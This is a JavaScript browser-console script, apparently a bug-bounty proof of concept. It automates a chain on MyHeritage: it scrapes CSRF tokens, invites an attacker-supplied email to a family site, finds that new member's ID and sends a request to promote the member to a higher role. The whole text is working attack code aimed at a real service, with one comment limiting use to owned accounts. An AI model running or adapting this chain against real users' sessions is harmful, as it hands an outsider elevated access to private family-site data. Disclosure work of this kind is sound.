// === MyHeritage: Invite -> Search -> Promote (fixed: no double /foz) ===
// Paste while logged in to your MyHeritage account.
// Only run on accounts you own / have explicit permission to automate.

(async () => {
  // ---------------- CONFIG ----------------
  const email = 'naysser+p1@bugcrowdninja.com'; // <<-- changed as requested
  const firstName = 'Hacked';
  const lastName = 'POC';
  const gender = 'M'; // 'M' or 'F' depending on site values
  const INVITE_WAIT_MS = 5500;        // wait after invite for server-side processing
  const SEARCH_RETRY = 10;            // retries to find the member row
  const SEARCH_RETRY_DELAY_MS = 2500; // delay between retries
  const DO_PROMOTE = true;            // set false to skip role assignment (safe test)
  const ALERT_ON_SUCCESS = true;      // show alerts on success/failure
  // ----------------------------------------

  const log = (...args) => console.log('[AutoInvite]', ...args);
  const alertIf = (msg) => { if (ALERT_ON_SUCCESS) try { alert(msg); } catch(e){} };

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  async function fetchText(url, opts = {}) {
    const merged = Object.assign({
      credentials: 'include',
      redirect: 'follow',
      headers: { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' }
    }, opts);
    const res = await fetch(url, merged);
    const text = await res.text();
    return { res, text, url: res.url };
  }

  try {
    log('Start flow for', email);

    // 1) determine siteID
    let siteID = null;
    try {
      const params = new URLSearchParams(window.location.search);
      siteID = params.get('s') || null;
      if (!siteID) {
        const m = window.location.pathname.match(/\/family-sites\/[^\/]+\/([A-Z0-9]+)/i);
        if (m) siteID = m[1];
      }
    } catch(e){}
    if (!siteID) {
      log('siteID not found in URL, attempting homepage redirect fetch...');
      try {
        const home = await fetchText('https://www.myheritage.com/');
        const m = (home.url || '').match(/\/family-sites\/[^\/]+\/([A-Z0-9]+)/i);
        if (m) siteID = m[1];
      } catch(e){ log('homepage fetch failed', e); }
    }
    if (!siteID) { log('Could not determine siteID. Aborting.'); return; }
    log('siteID =', siteID);

    // 2) fetch invite page to get csrf_token for invite
    const inviteURL = `https://www.myheritage.com/FP/member-invitation-instant.php?s=${siteID}&mode=multiple`;
    log('Fetching invite page for csrf...');
    let csrfInvite = null;
    try {
      const { text: inviteHTML } = await fetchText(inviteURL);
      let m = inviteHTML.match(/csrf_token=([A-Za-z0-9._-]+)/) || inviteHTML.match(/name=["']csrf_token["']\s+value=["']([^"']+)["']/i);
      if (m) csrfInvite = m[1];
      log('csrfInvite =', csrfInvite);
    } catch(e){ log('Error fetching invite page:', e); }
    if (!csrfInvite) { log('No csrf_token for invite found. Aborting.'); return; }

    // 3) send invite POST
    log('Preparing invite for', email);
    const fd = new URLSearchParams();
    fd.append('s', siteID);
    fd.append('inviteeGenderRadio0', 'on');
    fd.append('inviteeGender[]', gender);
    fd.append('inviteeFirstName[]', firstName);
    fd.append('inviteeLastName[]', lastName);
    fd.append('inviteeEmail[]', email);
    for (let i=0;i<4;i++){
      fd.append('inviteeGender[]', '');
      fd.append('inviteeFirstName[]', '');
      fd.append('inviteeLastName[]', '');
      fd.append('inviteeEmail[]', '');
    }
    fd.append('MultipleInvitationFields', '5');
    fd.append('action', 'send');
    fd.append('mode', 'multiple');
    fd.append('templatePath', '');
    fd.append('isQSW', '');
    fd.append('csrf_token', csrfInvite);

    log('Sending invite POST to', inviteURL);
    const inviteResp = await fetch(inviteURL, {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.myheritage.com',
        'Referer': inviteURL
      },
      body: fd.toString(),
      redirect: 'follow'
    });
    log('Invite status:', inviteResp.status);
    const inviteText = await inviteResp.text();
    log('Invite response preview:', inviteText.substring(0,500));
    if (!(inviteResp.ok || inviteResp.status === 302 || inviteResp.status === 303 || inviteResp.status === 200)) {
      log('Invite response not OK/redirect. Aborting.');
      return;
    }
    alertIf(`Invite sent for ${email}. Waiting ${INVITE_WAIT_MS}ms before searching...`);
    await sleep(INVITE_WAIT_MS);

    // 4) detect membersPageName (normalize, avoid double /foz)
    log('Detecting members page name (robust)...');
    let membersPageName = null;
    // try current URL
    try {
      const cur = window.location.href;
      const m = cur.match(/\/site-members-[A-Z0-9]+\/([^\/?#]+)/i);
      if (m) membersPageName = m[1];
    } catch(e){}

    // try DOM anchors
    if (!membersPageName) {
      try {
        const anchors = Array.from(document.querySelectorAll('a[href]'));
        for (const a of anchors) {
          const h = a.href;
          const mm = h.match(/\/site-members-[A-Z0-9]+\/([^\/?#]+)/i);
          if (mm) { membersPageName = mm[1]; break; }
        }
      } catch(e){ log('DOM anchors search error', e); }
    }

    // try fetching likely members endpoints to discover path
    if (!membersPageName) {
      const tries = [
        `https://www.myheritage.com/site-members-${siteID}/foz`,
        `https://www.myheritage.com/site-members-${siteID}/`,
        `https://www.myheritage.com/site-members-${siteID}`
      ];
      for (const t of tries) {
        try {
          const r = await fetchText(t);
          // check redirected URL
          if (r.url) {
            const mm = r.url.match(/\/site-members-[A-Z0-9]+\/([^\/?#]+)/i);
            if (mm) { membersPageName = mm[1]; break; }
          }
          const mm2 = r.text.match(/\/site-members-[A-Z0-9]+\/([^"'>\s]+)/i);
          if (mm2) { membersPageName = mm2[1]; break; }
        } catch(e){}
      }
    }

    // fallback for single-segment pages like /naysser
    if (!membersPageName) {
      try {
        const anchors = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
        for (const ln of anchors) {
          try {
            const u = new URL(ln);
            if (u.hostname && u.hostname.includes('myheritage.com')) {
              const p = u.pathname.replace(/^\/+|\/+$/g,'');
              if (p && !p.includes('/') && p.length < 60) { membersPageName = p; break; }
            }
          } catch(e){}
        }
      } catch(e){}
    }

    if (!membersPageName) { log('Could not detect membersPageName. Aborting.'); return; }
    // normalize: remove any leading/trailing slashes and avoid duplicate 'foz' suffix
    membersPageName = membersPageName.replace(/^\/+|\/+$/g,'').trim();
    log('membersPageName detected:', membersPageName);

    // base path to use (no added /foz)
    const membersBase = `https://www.myheritage.com/site-members-${siteID}/${membersPageName}`;
    log('membersBase =', membersBase);

    // 5) helper: fetch members base and extract fresh csrf
    async function getMembersCsrf() {
      // try membersBase first, then membersBase + '/foz'
      const candidates = [membersBase, membersBase + '/foz'];
      for (const u of candidates) {
        try {
          log('Fetching for csrf:', u);
          const { res, text, url } = await fetchText(u, { headers: { 'Referer': window.location.href } });
          // check redirected URL for token
          const rurl = url || '';
          const mm = rurl.match(/[?&]csrf_token=([A-Za-z0-9._-]+)/);
          if (mm) { log('csrf found in redirect URL:', mm[1]); return { csrf: mm[1], baseU: u, html: text }; }
          // check HTML
          const m2 = text.match(/name=["']csrf_token["']\s+value=["']([^"']+)["']/i) || text.match(/csrf_token=([A-Za-z0-9._-]+)/i);
          if (m2) { log('csrf found in HTML:', m2[1]); return { csrf: m2[1], baseU: u, html: text }; }
        } catch(e){ log('Error fetching for csrf at', u, e); }
      }
      return { csrf: null, baseU: null, html: null };
    }

    // 6) search function: will include csrf_token if found (no double /foz)
    async function searchByEmail(emailToFind) {
      const { csrf, baseU, html } = await getMembersCsrf();
      if (!csrf) log('Warning: no csrf found (search may 404).');
      const encoded = encodeURIComponent(emailToFind);
      const searchURL = `${membersBase}?csrf_token=${csrf ? encodeURIComponent(csrf) : ''}&page=1&action=search&filter=All&query=${encoded}&searchIn=new&scope=all`;
      log('Search URL:', searchURL);
      try {
        const { res, text, url } = await fetchText(searchURL, { headers: { 'Referer': baseU || window.location.href, 'X-Requested-With': 'XMLHttpRequest' } });
        log('Search status:', res.status, 'finalURL:', url);
        return { status: res.status, text, url, csrfFound: csrf, baseU };
      } catch(e) {
        log('Search fetch error:', e);
        return null;
      }
    }

    // 7) retry search until memberRow is found
    let memberID = null;
    let lastHTML = null;
    for (let attempt = 1; attempt <= SEARCH_RETRY; attempt++) {
      log(`Search attempt ${attempt}/${SEARCH_RETRY}...`);
      const r = await searchByEmail(email);
      if (r) {
        lastHTML = r.text;
        // strict extraction
        let mm = r.text.match(/<tr[^>]+id=["']memberRow_([A-Za-z0-9-_]+)["'][^>]*>/i);
        if (mm) { memberID = mm[1]; log('Found memberID (strict):', memberID); break; }
        // looser
        mm = r.text.match(/memberRow_([A-Za-z0-9-_]+)/i);
        if (mm) { memberID = mm[1]; log('Found memberID (loose):', memberID); break; }
        // search around email
        const idx = r.text.indexOf(email);
        if (idx !== -1) {
          const windowText = r.text.slice(Math.max(0, idx-500), idx+500);
          const m3 = windowText.match(/memberRow_([A-Za-z0-9-_]+)/i);
          if (m3) { memberID = m3[1]; log('Found memberID near email:', memberID); break; }
        }
      } else {
        log('Search returned no response.');
      }
      log('Member not found yet; sleeping before retry...');
      await sleep(SEARCH_RETRY_DELAY_MS);
    }

    if (!memberID) {
      log('Failed to find memberID after retries. Last search snippet (first 1500 chars):');
      if (lastHTML) console.log(lastHTML.substring(0,1500));
      return;
    }

    // 8) obtain fresh csrf (again) and promote
    const { csrf: csrfMembers } = await getMembersCsrf();
    log('csrfMembers =', csrfMembers);

    if (!DO_PROMOTE) {
      log('DO_PROMOTE is false — skipping promote. memberID=', memberID);
      alertIf('Invite + Search complete. Skipping promote (DO_PROMOTE=false).');
      return;
    }

    // build promote URL (no double /foz)
    let promoteURL = `${membersBase}?memberID=${encodeURIComponent(memberID)}&action=promote`;
    if (csrfMembers) promoteURL += `&csrf_token=${encodeURIComponent(csrfMembers)}`;
    log('Promote URL:', promoteURL);

    try {
      const promoteRes = await fetch(promoteURL, { method: 'GET', credentials: 'include', headers: { 'Referer': membersBase } });
      log('Promote status:', promoteRes.status, 'promote final URL may be:', promoteRes.url);
      const pt = await promoteRes.text();
      log('Promote response snippet:', pt.substring(0,600));
      if (promoteRes.ok) {
        alertIf(`✅ Promotion request sent for ${email}. Verify members list for the role change.`);
      } else {
        alertIf(`Promotion returned status ${promoteRes.status}. Check console for response snippet.`);
      }
    } catch(e) {
      log('Error during promote request:', e);
    }

    log('Flow complete. Verify members UI to ensure role changed.');
  } catch (err) {
    console.error('[AutoInvite] Unexpected error:', err);
  }
})();
